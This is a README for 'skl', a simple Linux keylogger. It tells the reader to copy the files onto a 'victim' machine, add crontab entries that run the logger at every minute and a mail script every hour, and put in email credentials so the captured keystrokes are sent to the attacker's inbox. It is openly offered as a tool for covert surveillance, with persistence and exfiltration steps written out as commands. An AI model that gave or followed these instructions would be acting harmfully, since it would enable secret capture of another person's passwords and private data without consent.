# skl = Simple Key Logger

Just a simple keylogger for linux

### Installing the required dependencies

        pip3 install -r requirements.txt

### Plant it own victim laptop
copy the files to any directory
on victim linux machine open linux terminal and crontab to run it at boot

    crontab -e

and at  the end of crontab add the following

    * * * * * cd (directory of keyloger) ; ./kl.py &
    0 * * * * cd (directory of keyloger) ; ./mail.py

restart the crontab or reboot

### Configuring to mail it to your email
open the mail.py with your favorite text editor
and put the email and pass word in the email and password variable and the email to recive the log file.

for example:
```python
email = 'sender@gmail.com'
password = 'password'
semail =  'reciver@gmail.com'
```